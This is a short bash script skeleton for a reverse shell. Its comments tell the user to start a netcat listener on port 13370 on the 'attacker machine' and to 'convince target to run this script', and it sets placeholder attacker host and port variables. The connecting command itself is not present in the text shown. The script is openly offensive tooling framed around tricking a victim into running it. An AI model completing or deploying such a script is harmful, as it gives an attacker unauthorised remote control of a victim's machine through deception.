#!/bin/bash
# Run netcat on the attacker machine:
# nc -lkvnp 13370

# Convince target to run this script:
echo "Running reverse shell"
ATTACKER_HOST=<YOUR HOST>
ATTACKER_PORT=13370
